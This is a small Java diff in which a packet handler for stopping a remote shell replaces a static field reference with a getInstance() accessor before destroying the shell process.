@@ -6,8 +6,8 @@ public class Packet24RemoteShellStop extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
-		if (RemoteShell.p != null) {
-			RemoteShell.p.destroy();
+		if (RemoteShell.getInstance() != null) {
+			RemoteShell.getInstance().destroy();
 		}
 	}
 
